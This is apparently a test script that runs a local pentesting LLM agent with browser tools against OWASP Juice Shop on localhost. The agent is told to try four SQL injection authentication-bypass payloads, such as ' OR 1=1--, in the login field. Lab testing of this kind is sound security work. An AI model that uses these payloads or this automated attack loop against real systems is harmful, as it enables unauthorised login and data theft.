# mini agente para probar herramientas del navegador e intentar sqli bypass en owasp juice shop

import json
import logging

from ollama import Client
from modulos.navegador import NavegadorAgente, declarar_tools_navegador

# config de la prueba
URL_OBJETIVO = "http://localhost:3000"
URL_LOGIN = "http://localhost:3000/#/login"
MODELO = "jonathanFS/pentest-owasp"     # o "pentest OWASP"
HOST = "http://localhost:11434"
LIMITE_ACCIONES = 6

# false muestra navegador en vivo, true graba video/capturas en fondo
HEADLESS = True

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s",
                    datefmt="%H:%M:%S")
log = logging.getLogger("test_navegador")


def main():
    nav = NavegadorAgente(
        url_objetivo=URL_OBJETIVO,
        headless=HEADLESS,
        logger=log,
    )

    client = Client(host=HOST)
    tools = declarar_tools_navegador()

    mensajes = [
        {"role": "system", "content":
            "Eres un agente de pentesting en una auditoria AUTORIZADA. Tienes un "
            "navegador real para interactuar con el sitio. Solo puedes usar las "
            "herramientas disponibles. IMPORTANTE: usa los payloads EXACTAMENTE "
            "como se te indican, sin modificarlos, sin escapar comillas y sin "
            "agregar secuencias como \\x27. Cuando un login tenga posible_exito "
            "true, repórtalo y deja de pedir herramientas."},
        {"role": "user", "content":
            f"El objetivo {URL_OBJETIVO} tiene un formulario de login en "
            f"{URL_LOGIN}. Comprueba si es vulnerable a inyeccion SQL de bypass de "
            f"autenticacion.\n\n"
            f"Paso 1: navega a {URL_LOGIN}.\n"
            f"Paso 2: prueba el login usando cada uno de estos payloads en el "
            f"campo usuario (con cualquier contrasena, por ejemplo 'x'), UNO POR "
            f"UNO y tal cual, hasta que uno tenga exito:\n"
            f"  1. ' OR 1=1--\n"
            f"  2. ' OR 1=1-- -\n"
            f"  3. admin' --\n"
            f"  4. ' OR '1'='1'--\n"
            f"Copia el payload literal en el campo usuario, sin comillas extra ni "
            f"modificaciones."},
    ]

    acciones = 0
    try:
        while acciones < LIMITE_ACCIONES:
            resp = client.chat(model=MODELO, messages=mensajes, tools=tools)
            msg = resp.message
            mensajes.append(msg)

            if not msg.tool_calls:
                log.info("El agente no pidio mas herramientas. Fin.")
                if msg.content:
                    log.info(f"Conclusion del agente: {msg.content}")
                break

            for tc in msg.tool_calls:
                acciones += 1
                nombre = tc.function.name
                args = dict(tc.function.arguments or {})
                log.info(f"Accion {acciones}: {nombre}({args})")

                if nombre == "navegar":
                    resultado = nav.navegar(args.get("url", URL_OBJETIVO))
                elif nombre == "probar_login":
                    resultado = nav.probar_login(
                        args.get("usuario", ""), args.get("contrasena", ""))
                elif nombre == "tomar_captura":
                    resultado = nav.tomar_captura(args.get("nota", ""))
                else:
                    resultado = {"error": f"Herramienta desconocida: {nombre}"}

                log.info(f"   -> {resultado}")
                mensajes.append({
                    "role": "tool",
                    "tool_name": nombre,
                    "content": json.dumps(resultado, ensure_ascii=False),
                })
    finally:
        video = nav.cerrar()
        print("\n" + "=" * 60)
        print(f"Capturas generadas: {len(nav.capturas)}")
        for c in nav.capturas:
            print("   ", c)
        if video:
            print(f"Video de la sesion: {video}")
        print("=" * 60)


if __name__ == "__main__":
    main()